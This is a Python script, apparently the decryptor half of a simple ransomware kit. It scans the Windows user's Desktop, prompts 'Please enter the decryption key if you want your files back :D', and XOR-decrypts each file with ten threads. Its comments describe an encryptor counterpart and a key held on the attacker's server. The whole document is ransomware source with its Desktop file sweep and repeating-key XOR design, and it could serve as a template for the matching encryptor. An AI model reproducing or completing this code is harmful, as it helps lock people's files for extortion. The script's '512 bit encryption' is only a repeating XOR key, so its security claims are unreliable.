import os
import threading
import queue

# Passing 'key' as an argument
def decrypt(key):
    file = q.get()
    print(f'Decrypting {file}')
    try:
        # Decryptor is pretty much identical to Encryptor
        # This just needs the key from attacker's server
        # to reverse the process
        key_index = 0
        max_key_index = len(key) - 1
        # Empty variable preparing to store encrypted_data
        encrypted_data = ''
        
        # Opens the file as read-only in binary format
        # Starts reading from the beginning of the file
        # This is usually used when dealing with images, videos
        with open(file, 'rb') as f:
            data = f.read()
        # Opens in write-only mode
        # The pointer is placed at the beginning of the file
        # and This will overwrite any existing file with the same name
        # It will create a new file if 1 with the same name does NOT exist
        with open(file, 'w') as f:
            f.write('')
        for byte in data:
            xor_byte = byte ^ ord(key[key_index])
            # Opens a file for appending in binary mode    
            with open(file, 'ab') as f:
                f.write(xor_byte.to_bytes(1, 'little'))
            
            # Increment key index
            if key_index >= max_key_index:
                key_index = 0
            else:
                key_index += 1
        print(f'{file} successfully decrypted!')
    except:
        print('Failed to decrypt the file :(')
    q.task_done()
            
# Decryption Information
ENCRYPTION_LEVEL = 512 // 8 # 512 bit encryption = 64 bytes
key_char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>?,./;[]{}\|'
key_char_pool_len = len(key_char_pool)  

# Grab Filepaths to decrypt
print("Preparing files...")

# Locating C:\Users\USER\Desktop
desktop_path = os.environ['USERPROFILE'] + '\\Desktop'

# Listing C:\User\USER\Desktop
files = os.listdir(desktop_path)

# Creating an empty preparing to store abs files
abs_files = []

for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}') and f != __file__[:-2]+'exe':
        # If conditions met, store C:\Users\USER\Desktop\eachFile to abs_files[]
        abs_files.append(f'{desktop_path}\\{f}')
print('Successfully located all files!')
    
key =  input('Please enter the decryption key if you want your files back :D')
# Setup Queue with jobs for threads to decrypt
q = queue.Queue()
for f in abs_files:
    # Put eachFile in abs_files[] to queue
    q.put(f)

# Setup Threading to get ready for decryption
for i in range(10):
    t = threading.Thread(target=decrypt, args=(key,), daemon=True)
    t.start()
    
q.join()
print('Decryption is comeplete :D')
input()